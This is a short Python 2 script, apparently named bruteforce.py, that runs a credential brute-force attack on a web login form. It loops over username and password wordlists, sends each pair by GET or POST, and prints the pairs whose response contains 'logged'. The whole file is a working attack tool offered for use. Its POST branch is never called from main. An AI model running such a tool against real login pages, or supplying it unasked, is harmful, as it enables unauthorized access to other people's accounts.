#!/usr/bin/python -tt
import urllib
import sys

def get(baseurl,usernames,passwords):
     for u in usernames:
         for p in passwords:
             data={sys.argv[2]:u,sys.argv[4]:p}
             encoded_args=urllib.urlencode(data)
             op = urllib.urlopen(baseurl+encoded_args)
             if 'logged' in op.read():
                 print "\nUser = "+u.ljust(20)+"Password = "+p.ljust(20)


def post(baseurl,usernames,passwords):
    for u in usernames:
        for p in passwords:
            data={'username':u,'password':p}
            encoded_args=urllib.urlencode(data)
            op = urllib.urlopen(baseurl,encoded_args)
            if 'logged' in op.read():
                print "\nUsername = "+u.ljust(20)+"Password = "+p.ljust(20)

def main():
    try:

        usernames = open(sys.argv[3],'r').read().split('\n')
        passwords = open(sys.argv[5],'r').read().split('\n')
        baseurl=sys.argv[1]+'?'

        print "STARTING BRUTE FORCE ATTACK".center(50,"*")
    
        if sys.argv[6]=='GET':
            get(baseurl,usernames,passwords)
    except:
        #print sys.exc_info()[0]
        print 'Usage: python bruteforce.py [URL] [Field Name] [User List] [Field Name] [Password List] [Method]'
        print 'Field Name - user, username, email, etc\nMethod - GET,POST'
if __name__ == '__main__':
    main()
